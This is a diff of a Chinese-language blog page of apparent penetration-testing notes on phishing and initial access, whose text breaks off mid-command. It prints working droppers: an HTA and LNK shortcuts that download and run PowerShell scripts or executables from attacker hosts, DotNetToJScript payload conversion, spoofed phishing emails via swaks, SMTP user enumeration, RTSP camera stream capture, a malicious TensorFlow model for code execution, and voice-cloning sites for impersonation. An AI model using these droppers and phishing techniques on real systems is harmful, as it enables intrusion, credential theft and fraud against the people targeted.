@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="钓鱼相关-投放器构造-载荷构造\r.hta加载js源码\r（逐渐抛弃，特定情况再使用，容易被浏览器沙箱gank）\n&lt;html&gt; &lt;head&gt; &lt;script language=&#34;JScript&#34;&gt; var shell = new ActiveXObject(&#34;WScript.Shell&#34;); shell.Run(&#34;powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString(&#39;http://攻击机IP/shell.ps1&#39;)&#34;); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt;self.close();&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; lnk投放（快捷方式-命令执行）\r首先需要在测试环境生成\n加载反射源码\n$WshShell = New-Object -ComObject WScript.Shell $Shortcut = $WshShell.CreateShortcut(&#34;$env:USERPROFILE\\Desktop\\update.lnk&#34;) $Shortcut.TargetPath = &#34;cmd.exe&#34; $Shortcut.Arguments = &#34;/c powershell -ExecutionPolicy Bypass -WindowStyle Hidden -c `&#34;IEX(New-Object Net.WebClient).DownloadString(&#39;http://192.168.174.129:88/shell.ps1&#39;)`&#34;&#34; $Shortcut.WindowStyle = 7 $Shortcut.IconLocation = &#34;C:\\Windows\\System32\\shell32.dll,3&#34; $Shortcut.Save() 远程下载木马执行（无powershell）\n$WshShell = New-Object -ComObject WScript.Shell $Shortcut = $WshShell.CreateShortcut(&#34;$env:USERPROFILE\\Desktop\\update.lnk&#34;) $Shortcut.TargetPath = &#34;cmd.exe&#34; $Shortcut.Arguments = &#34;/c certutil -urlcache -split -f http://192.168.174.129:88/fuck.exe C:\\Windows\\Tasks\\fuck.exe &amp;&amp; C:\\Windows\\Tasks\\fuck.exe&#34; $Shortcut.WindowStyle = 7 # 最小化窗口 $Shortcut.IconLocation = &#34;C:\\Windows\\System32\\shell32.dll,23&#34; # 文档图标 $Shortcut.Save() 也可以利用下面的命令反向查找lnk文件指向\n">
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="钓鱼相关\r.hta加载js源码\r（逐渐抛弃，特定情况再使用，容易被浏览器沙箱gank）\n&lt;html&gt; &lt;head&gt; &lt;script language=&#34;JScript&#34;&gt; var shell = new ActiveXObject(&#34;WScript.Shell&#34;); shell.Run(&#34;powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString(&#39;http://攻击机IP/shell.ps1&#39;)&#34;); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt;self.close();&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; lnk投放（快捷方式-命令执行）\r首先需要在测试环境生成\n加载反射源码\n$WshShell = New-Object -ComObject WScript.Shell $Shortcut = $WshShell.CreateShortcut(&#34;$env:USERPROFILE\\Desktop\\update.lnk&#34;) $Shortcut.TargetPath = &#34;cmd.exe&#34; $Shortcut.Arguments = &#34;/c powershell -ExecutionPolicy Bypass -WindowStyle Hidden -c `&#34;IEX(New-Object Net.WebClient).DownloadString(&#39;http://192.168.174.129:88/shell.ps1&#39;)`&#34;&#34; $Shortcut.WindowStyle = 7 $Shortcut.IconLocation = &#34;C:\\Windows\\System32\\shell32.dll,3&#34; $Shortcut.Save() 远程下载木马执行（无powershell）\n$WshShell = New-Object -ComObject WScript.Shell $Shortcut = $WshShell.CreateShortcut(&#34;$env:USERPROFILE\\Desktop\\update.lnk&#34;) $Shortcut.TargetPath = &#34;cmd.exe&#34; $Shortcut.Arguments = &#34;/c certutil -urlcache -split -f http://192.168.174.129:88/fuck.exe C:\\Windows\\Tasks\\fuck.exe &amp;&amp; C:\\Windows\\Tasks\\fuck.exe&#34; $Shortcut.WindowStyle = 7 # 最小化窗口 $Shortcut.IconLocation = &#34;C:\\Windows\\System32\\shell32.dll,23&#34; # 文档图标 $Shortcut.Save() 也可以利用下面的命令反向查找lnk文件指向\n">
 <title>渊蜂之书</title>
 
 <link rel='canonical' href='https://wackymaker.github.io/post/%E6%B8%8A%E8%9C%82%E4%B9%8B%E4%B9%A6/'>
 
 <link rel="stylesheet" href="/scss/style.min.cfa5b1b0e78d61c00a14173992a1f3fa3b5c1b9fa34d023de959af564e7b19dd.css"><meta property='og:title' content="渊蜂之书">
-<meta property='og:description' content="钓鱼相关-投放器构造-载荷构造\r.hta加载js源码\r（逐渐抛弃，特定情况再使用，容易被浏览器沙箱gank）\n&lt;html&gt; &lt;head&gt; &lt;script language=&#34;JScript&#34;&gt; var shell = new ActiveXObject(&#34;WScript.Shell&#34;); shell.Run(&#34;powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString(&#39;http://攻击机IP/shell.ps1&#39;)&#34;); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt;self.close();&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; lnk投放（快捷方式-命令执行）\r首先需要在测试环境生成\n加载反射源码\n$WshShell = New-Object -ComObject WScript.Shell $Shortcut = $WshShell.CreateShortcut(&#34;$env:USERPROFILE\\Desktop\\update.lnk&#34;) $Shortcut.TargetPath = &#34;cmd.exe&#34; $Shortcut.Arguments = &#34;/c powershell -ExecutionPolicy Bypass -WindowStyle Hidden -c `&#34;IEX(New-Object Net.WebClient).DownloadString(&#39;http://192.168.174.129:88/shell.ps1&#39;)`&#34;&#34; $Shortcut.WindowStyle = 7 $Shortcut.IconLocation = &#34;C:\\Windows\\System32\\shell32.dll,3&#34; $Shortcut.Save() 远程下载木马执行（无powershell）\n$WshShell = New-Object -ComObject WScript.Shell $Shortcut = $WshShell.CreateShortcut(&#34;$env:USERPROFILE\\Desktop\\update.lnk&#34;) $Shortcut.TargetPath = &#34;cmd.exe&#34; $Shortcut.Arguments = &#34;/c certutil -urlcache -split -f http://192.168.174.129:88/fuck.exe C:\\Windows\\Tasks\\fuck.exe &amp;&amp; C:\\Windows\\Tasks\\fuck.exe&#34; $Shortcut.WindowStyle = 7 # 最小化窗口 $Shortcut.IconLocation = &#34;C:\\Windows\\System32\\shell32.dll,23&#34; # 文档图标 $Shortcut.Save() 也可以利用下面的命令反向查找lnk文件指向\n">
+<meta property='og:description' content="钓鱼相关\r.hta加载js源码\r（逐渐抛弃，特定情况再使用，容易被浏览器沙箱gank）\n&lt;html&gt; &lt;head&gt; &lt;script language=&#34;JScript&#34;&gt; var shell = new ActiveXObject(&#34;WScript.Shell&#34;); shell.Run(&#34;powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString(&#39;http://攻击机IP/shell.ps1&#39;)&#34;); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt;self.close();&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; lnk投放（快捷方式-命令执行）\r首先需要在测试环境生成\n加载反射源码\n$WshShell = New-Object -ComObject WScript.Shell $Shortcut = $WshShell.CreateShortcut(&#34;$env:USERPROFILE\\Desktop\\update.lnk&#34;) $Shortcut.TargetPath = &#34;cmd.exe&#34; $Shortcut.Arguments = &#34;/c powershell -ExecutionPolicy Bypass -WindowStyle Hidden -c `&#34;IEX(New-Object Net.WebClient).DownloadString(&#39;http://192.168.174.129:88/shell.ps1&#39;)`&#34;&#34; $Shortcut.WindowStyle = 7 $Shortcut.IconLocation = &#34;C:\\Windows\\System32\\shell32.dll,3&#34; $Shortcut.Save() 远程下载木马执行（无powershell）\n$WshShell = New-Object -ComObject WScript.Shell $Shortcut = $WshShell.CreateShortcut(&#34;$env:USERPROFILE\\Desktop\\update.lnk&#34;) $Shortcut.TargetPath = &#34;cmd.exe&#34; $Shortcut.Arguments = &#34;/c certutil -urlcache -split -f http://192.168.174.129:88/fuck.exe C:\\Windows\\Tasks\\fuck.exe &amp;&amp; C:\\Windows\\Tasks\\fuck.exe&#34; $Shortcut.WindowStyle = 7 # 最小化窗口 $Shortcut.IconLocation = &#34;C:\\Windows\\System32\\shell32.dll,23&#34; # 文档图标 $Shortcut.Save() 也可以利用下面的命令反向查找lnk文件指向\n">
 <meta property='og:url' content='https://wackymaker.github.io/post/%E6%B8%8A%E8%9C%82%E4%B9%8B%E4%B9%A6/'>
 <meta property='og:site_name' content='wackymaker'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='社之魔法' /><meta property='article:published_time' content='2025-08-23T21:25:37&#43;08:00'/><meta property='article:modified_time' content='2025-08-23T21:25:37&#43;08:00'/>
 <meta name="twitter:title" content="渊蜂之书">
-<meta name="twitter:description" content="钓鱼相关-投放器构造-载荷构造\r.hta加载js源码\r（逐渐抛弃，特定情况再使用，容易被浏览器沙箱gank）\n&lt;html&gt; &lt;head&gt; &lt;script language=&#34;JScript&#34;&gt; var shell = new ActiveXObject(&#34;WScript.Shell&#34;); shell.Run(&#34;powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString(&#39;http://攻击机IP/shell.ps1&#39;)&#34;); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt;self.close();&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; lnk投放（快捷方式-命令执行）\r首先需要在测试环境生成\n加载反射源码\n$WshShell = New-Object -ComObject WScript.Shell $Shortcut = $WshShell.CreateShortcut(&#34;$env:USERPROFILE\\Desktop\\update.lnk&#34;) $Shortcut.TargetPath = &#34;cmd.exe&#34; $Shortcut.Arguments = &#34;/c powershell -ExecutionPolicy Bypass -WindowStyle Hidden -c `&#34;IEX(New-Object Net.WebClient).DownloadString(&#39;http://192.168.174.129:88/shell.ps1&#39;)`&#34;&#34; $Shortcut.WindowStyle = 7 $Shortcut.IconLocation = &#34;C:\\Windows\\System32\\shell32.dll,3&#34; $Shortcut.Save() 远程下载木马执行（无powershell）\n$WshShell = New-Object -ComObject WScript.Shell $Shortcut = $WshShell.CreateShortcut(&#34;$env:USERPROFILE\\Desktop\\update.lnk&#34;) $Shortcut.TargetPath = &#34;cmd.exe&#34; $Shortcut.Arguments = &#34;/c certutil -urlcache -split -f http://192.168.174.129:88/fuck.exe C:\\Windows\\Tasks\\fuck.exe &amp;&amp; C:\\Windows\\Tasks\\fuck.exe&#34; $Shortcut.WindowStyle = 7 # 最小化窗口 $Shortcut.IconLocation = &#34;C:\\Windows\\System32\\shell32.dll,23&#34; # 文档图标 $Shortcut.Save() 也可以利用下面的命令反向查找lnk文件指向\n">
+<meta name="twitter:description" content="钓鱼相关\r.hta加载js源码\r（逐渐抛弃，特定情况再使用，容易被浏览器沙箱gank）\n&lt;html&gt; &lt;head&gt; &lt;script language=&#34;JScript&#34;&gt; var shell = new ActiveXObject(&#34;WScript.Shell&#34;); shell.Run(&#34;powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString(&#39;http://攻击机IP/shell.ps1&#39;)&#34;); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt;self.close();&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; lnk投放（快捷方式-命令执行）\r首先需要在测试环境生成\n加载反射源码\n$WshShell = New-Object -ComObject WScript.Shell $Shortcut = $WshShell.CreateShortcut(&#34;$env:USERPROFILE\\Desktop\\update.lnk&#34;) $Shortcut.TargetPath = &#34;cmd.exe&#34; $Shortcut.Arguments = &#34;/c powershell -ExecutionPolicy Bypass -WindowStyle Hidden -c `&#34;IEX(New-Object Net.WebClient).DownloadString(&#39;http://192.168.174.129:88/shell.ps1&#39;)`&#34;&#34; $Shortcut.WindowStyle = 7 $Shortcut.IconLocation = &#34;C:\\Windows\\System32\\shell32.dll,3&#34; $Shortcut.Save() 远程下载木马执行（无powershell）\n$WshShell = New-Object -ComObject WScript.Shell $Shortcut = $WshShell.CreateShortcut(&#34;$env:USERPROFILE\\Desktop\\update.lnk&#34;) $Shortcut.TargetPath = &#34;cmd.exe&#34; $Shortcut.Arguments = &#34;/c certutil -urlcache -split -f http://192.168.174.129:88/fuck.exe C:\\Windows\\Tasks\\fuck.exe &amp;&amp; C:\\Windows\\Tasks\\fuck.exe&#34; $Shortcut.WindowStyle = 7 # 最小化窗口 $Shortcut.IconLocation = &#34;C:\\Windows\\System32\\shell32.dll,23&#34; # 文档图标 $Shortcut.Save() 也可以利用下面的命令反向查找lnk文件指向\n">
     </head>
     <body class="
     article-page
@@ -207,33 +207,40 @@
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ul>
-    <li><a href="#hta加载js源码">.hta加载js源码</a></li>
-    <li><a href="#lnk投放快捷方式-命令执行">lnk投放（快捷方式-命令执行）</a></li>
-    <li><a href="#wsh载荷构筑js载荷构筑csharp载荷转换js">wsh载荷构筑（js载荷构筑，csharp载荷转换js）</a></li>
-  </ul>
-
-  <ul>
-    <li><a href="#smtp枚举用户名">smtp枚举用户名</a></li>
-    <li><a href="#邮件钓鱼-投放载荷or恶意链接">邮件钓鱼-投放载荷or恶意链接</a>
+    <li><a href="#钓鱼相关">钓鱼相关</a>
       <ul>
-        <li><a href="#swaks-邮件伪造">swaks-邮件伪造</a></li>
+        <li><a href="#hta加载js源码">.hta加载js源码</a></li>
+        <li><a href="#lnk投放快捷方式-命令执行">lnk投放（快捷方式-命令执行）</a></li>
+        <li><a href="#wsh载荷构筑js载荷构筑csharp载荷转换js">wsh载荷构筑（js载荷构筑，csharp载荷转换js）</a></li>
       </ul>
     </li>
-  </ul>
-
-  <ul>
-    <li><a href="#rstp服务利用">rstp服务利用</a></li>
-  </ul>
-
-  <ul>
-    <li><a href="#ai语音克隆">ai语音克隆</a></li>
-    <li><a href="#tensorflow投毒">tensorflow投毒</a></li>
-  </ul>
-
-  <ul>
-    <li><a href="#linux抓取挂载usb所有信息">linux抓取挂载usb所有信息</a>
+    <li><a href="#邮件方向利用">邮件方向利用</a>
       <ul>
-        <li><a href="#利用">利用</a></li>
+        <li><a href="#smtp枚举用户名">smtp枚举用户名</a></li>
+        <li><a href="#邮件钓鱼-投放载荷or恶意链接">邮件钓鱼-投放载荷or恶意链接</a></li>
+      </ul>
+    </li>
+    <li><a href="#摄像头方向利用">摄像头方向利用</a>
+      <ul>
+        <li><a href="#rstp服务利用">rstp服务利用</a></li>
+      </ul>
+    </li>
+    <li><a href="#ai方向利用">ai方向利用</a>
+      <ul>
+        <li><a href="#ai语音克隆">ai语音克隆</a></li>
+        <li><a href="#tensorflow投毒">tensorflow投毒</a></li>
+      </ul>
+    </li>
+    <li><a href="#usb方向利用">usb方向利用</a>
+      <ul>
+        <li><a href="#linux抓取挂载usb所有信息">linux抓取挂载usb所有信息</a></li>
+      </ul>
+    </li>
+    <li><a href="#wifi无线相关">wifi无线相关</a>
+      <ul>
+        <li><a href="#linux连接wifi相关">linux连接wifi相关</a></li>
+        <li><a href="#wireshark分析管理帧">wireshark分析管理帧</a></li>
+        <li><a href="#切换网卡监听模式并恢复">切换网卡监听模式并恢复</a></li>
       </ul>
     </li>
   </ul>
@@ -300,7 +307,7 @@
 
 
                 <time class="article-time--reading">
-                    3 minute read
+                    4 minute read
                 </time>
             </div>
         
@@ -315,9 +322,9 @@
     <section class="article-content">
     
     
-    <h1 id="钓鱼相关-投放器构造-载荷构造">钓鱼相关-投放器构造-载荷构造
-</h1><h2 id="hta加载js源码">.hta加载js源码
-</h2><p>（逐渐抛弃，特定情况再使用，容易被浏览器沙箱gank）</p>
+    <h2 id="钓鱼相关">钓鱼相关
+</h2><h3 id="hta加载js源码">.hta加载js源码
+</h3><p>（逐渐抛弃，特定情况再使用，容易被浏览器沙箱gank）</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>&lt;html&gt;
 </span></span><span style="display:flex;"><span>&lt;head&gt;
 </span></span><span style="display:flex;"><span>&lt;script language<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;JScript&#34;</span>&gt;
@@ -329,8 +336,8 @@
 </span></span><span style="display:flex;"><span>&lt;script&gt;self.close<span style="color:#f92672">()</span>;&lt;/script&gt;
 </span></span><span style="display:flex;"><span>&lt;/body&gt;
 </span></span><span style="display:flex;"><span>&lt;/html&gt;
-</span></span></code></pre></div><h2 id="lnk投放快捷方式-命令执行">lnk投放（快捷方式-命令执行）
-</h2><p>首先需要在测试环境生成</p>
+</span></span></code></pre></div><h3 id="lnk投放快捷方式-命令执行">lnk投放（快捷方式-命令执行）
+</h3><p>首先需要在测试环境生成</p>
 <p>加载反射源码</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$WshShell = New-Object -ComObject WScript.Shell
 </span></span><span style="display:flex;"><span>$Shortcut = $WshShell.CreateShortcut(<span style="color:#e6db74">&#34;</span>$env:USERPROFILE<span style="color:#e6db74">\Desktop\update.lnk&#34;</span>)
@@ -349,27 +356,27 @@
 </span></span><span style="display:flex;"><span>$Shortcut.Save()
 </span></span></code></pre></div><p>也可以利用下面的命令反向查找lnk文件指向</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>powershell -c <span style="color:#e6db74">&#34;</span>$sh<span style="color:#e6db74"> = New-Object -ComObject WScript.Shell; </span>$sh<span style="color:#e6db74">.CreateShortcut(&#39;.\target.lnk&#39;).TargetPath&#34;</span>
-</span></span></code></pre></div><h2 id="wsh载荷构筑js载荷构筑csharp载荷转换js">wsh载荷构筑（js载荷构筑，csharp载荷转换js）
-</h2><p>dontnettojscript 转换命令</p>
+</span></span></code></pre></div><h3 id="wsh载荷构筑js载荷构筑csharp载荷转换js">wsh载荷构筑（js载荷构筑，csharp载荷转换js）
+</h3><p>dontnettojscript 转换命令</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>DotNetToJScript.exe ExampleAssembly.dll --lang<span style="color:#f92672">=</span>jscript --var<span style="color:#f92672">=</span>v4 -o shell.js
-</span></span></code></pre></div><h1 id="邮件方向利用">邮件方向利用
-</h1><h2 id="smtp枚举用户名">smtp枚举用户名
-</h2><p>使用工具</p>
+</span></span></code></pre></div><h2 id="邮件方向利用">邮件方向利用
+</h2><h3 id="smtp枚举用户名">smtp枚举用户名
+</h3><p>使用工具</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>github.com/cytopia/smtp-user-enum?tab<span style="color:#f92672">=</span>readme-ov-file#smiling_imp-vrfy-mode-default
 </span></span></code></pre></div><p>RCPT TO模式（指点收件人发送，模拟正常邮件）</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>smtp-user-enum -U /home/wackymaker/tools/dic/userNameDict/multiplesources-users-fabian-fingerle.de.txt -D $domain -t $ip -m $线程数 -p $port -M RCPT
 </span></span></code></pre></div><p>VRFY模式(默认的直接测试模式)</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>smtp-user-enum -U /home/wackymaker/tools/dic/userNameDict/multiplesources-users-fabian-fingerle.de.txt -D $domain -t $ip -m $线程数 -p $port
-</span></span></code></pre></div><h2 id="邮件钓鱼-投放载荷or恶意链接">邮件钓鱼-投放载荷or恶意链接
-</h2><p>一般需要将各种模式都测试一下</p>
-<h3 id="swaks-邮件伪造">swaks-邮件伪造
-</h3><h4 id="附带文件">附带文件
-</h4><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>swaks --to jobs@cowmotors-int.com --from amit@rocks.com --header <span style="color:#e6db74">&#34;Subject: My CV&#34;</span> --body <span style="color:#e6db74">&#34;Attached my CV to this mail, thank you!&#34;</span> --attach @rev.doc --server 192.168.209.201
-</span></span></code></pre></div><h4 id="钓鱼链接">钓鱼链接
-</h4><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>swaks --body <span style="color:#e6db74">&#39;Please click here http://192.168.45.164/payload.hta&#39;</span> --add-header <span style="color:#e6db74">&#34;MIME-Version: 1.0&#34;</span> --add-header <span style="color:#e6db74">&#34;Content-Type:text/html&#34;</span> --header <span style="color:#e6db74">&#34;Subject: Issues with mail&#34;</span> --to Will@tricky.com --from will01@tricky.com --server 192.168.105.159
-</span></span></code></pre></div><h1 id="摄像头方向利用">摄像头方向利用
-</h1><h2 id="rstp服务利用">rstp服务利用
-</h2><p>如果侦测到存在rstp服务，也就是实时视频流服务，例如</p>
+</span></span></code></pre></div><h3 id="邮件钓鱼-投放载荷or恶意链接">邮件钓鱼-投放载荷or恶意链接
+</h3><p>一般需要将各种模式都测试一下</p>
+<h4 id="swaks-邮件伪造">swaks-邮件伪造
+</h4><h5 id="附带文件">附带文件
+</h5><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>swaks --to jobs@cowmotors-int.com --from amit@rocks.com --header <span style="color:#e6db74">&#34;Subject: My CV&#34;</span> --body <span style="color:#e6db74">&#34;Attached my CV to this mail, thank you!&#34;</span> --attach @rev.doc --server 192.168.209.201
+</span></span></code></pre></div><h5 id="钓鱼链接">钓鱼链接
+</h5><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>swaks --body <span style="color:#e6db74">&#39;Please click here http://192.168.45.164/payload.hta&#39;</span> --add-header <span style="color:#e6db74">&#34;MIME-Version: 1.0&#34;</span> --add-header <span style="color:#e6db74">&#34;Content-Type:text/html&#34;</span> --header <span style="color:#e6db74">&#34;Subject: Issues with mail&#34;</span> --to Will@tricky.com --from will01@tricky.com --server 192.168.105.159
+</span></span></code></pre></div><h2 id="摄像头方向利用">摄像头方向利用
+</h2><h3 id="rstp服务利用">rstp服务利用
+</h3><p>如果侦测到存在rstp服务，也就是实时视频流服务，例如</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/prolab/fullhouse/10.0.52.5<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ nmap -p 22,554 -sC -sV $ip
 </span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-06-07 10:33 EDT
@@ -407,13 +414,13 @@
 </span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 59.19 seconds
 </span></span></code></pre></div><p>就可以利用ffmpeg截取视频流</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>ffmpeg -rtsp_transport tcp -i rtsp://1$ip/mpeg4 -c copy out.mp4
-</span></span></code></pre></div><h1 id="ai方向利用">ai方向利用
-</h1><h2 id="ai语音克隆">ai语音克隆
-</h2><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>好用的网站
+</span></span></code></pre></div><h2 id="ai方向利用">ai方向利用
+</h2><h3 id="ai语音克隆">ai语音克隆
+</h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>好用的网站
 </span></span><span style="display:flex;"><span>https://app.play.ht/home（付费下载）
 </span></span><span style="display:flex;"><span>https://fish.audio（免费）
-</span></span></code></pre></div><h2 id="tensorflow投毒">tensorflow投毒
-</h2><p>文章如下</p>
+</span></span></code></pre></div><h3 id="tensorflow投毒">tensorflow投毒
+</h3><p>文章如下</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model
 </span></span></code></pre></div><p>示例生成模型代码</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> tensorflow <span style="color:#66d9ef">as</span> tf
@@ -429,9 +436,9 @@
 </span></span><span style="display:flex;"><span>model<span style="color:#f92672">.</span>add(tf<span style="color:#f92672">.</span>keras<span style="color:#f92672">.</span>layers<span style="color:#f92672">.</span>Lambda(exploit))
 </span></span><span style="display:flex;"><span>model<span style="color:#f92672">.</span>compile()
 </span></span><span style="display:flex;"><span>model<span style="color:#f92672">.</span>save(<span style="color:#e6db74">&#34;wacky.h5&#34;</span>)
-</span></span></code></pre></div><h1 id="usb方向利用">usb方向利用
-</h1><h2 id="linux抓取挂载usb所有信息">linux抓取挂载usb所有信息
-</h2><p>进入系统利用mount查看挂载设备</p>
+</span></span></code></pre></div><h2 id="usb方向利用">usb方向利用
+</h2><h3 id="linux抓取挂载usb所有信息">linux抓取挂载usb所有信息
+</h3><p>进入系统利用mount查看挂载设备</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>mount
 </span></span><span style="display:flex;"><span>检查这个分区/dev/sdb
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#举例如下</span>
@@ -459,12 +466,53 @@
 </span></span><span style="display:flex;"><span>loop0    7:0    <span style="color:#ae81ff">0</span>   10M  <span style="color:#ae81ff">0</span> loop 
 </span></span><span style="display:flex;"><span>sda      8:0    <span style="color:#ae81ff">0</span> 80.1G  <span style="color:#ae81ff">0</span> disk 
 </span></span><span style="display:flex;"><span>└─sda1   8:1    <span style="color:#ae81ff">0</span> 80.1G  <span style="color:#ae81ff">0</span> part /
-</span></span></code></pre></div><h3 id="利用">利用
-</h3><h4 id="挂载并当目录利用">挂载并当目录利用
+</span></span></code></pre></div><h4 id="挂载并当目录利用">挂载并当目录利用
 </h4><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>sudo mkdir -p /mnt/usbimg
 </span></span><span style="display:flex;"><span>sudo mount /dev/loop0 /mnt/usbimg
 </span></span></code></pre></div><h4 id="恢复此u盘所有删除信息">恢复此u盘所有删除信息
 </h4><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>sudo extundelete /dev/loop0p1 --restore-all
+</span></span></code></pre></div><h2 id="wifi无线相关">wifi无线相关
+</h2><h3 id="linux连接wifi相关">linux连接wifi相关
+</h3><p>查看无线网卡状态</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>iwconfig
+</span></span></code></pre></div><p>查看wifi列表</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>nmcli dev wifi list
+</span></span></code></pre></div><p>连接wifi</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>nmcli dev wifi connect <span style="color:#e6db74">&#34;SSID&#34;</span> password <span style="color:#e6db74">&#34;PASSWORD&#34;</span> ifname wlan0
+</span></span></code></pre></div><p>查看当前连接</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>nmcli con show --active
+</span></span></code></pre></div><p>断开连接并删除记录</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>nmcli con down id <span style="color:#e6db74">&#34;SSID&#34;</span>
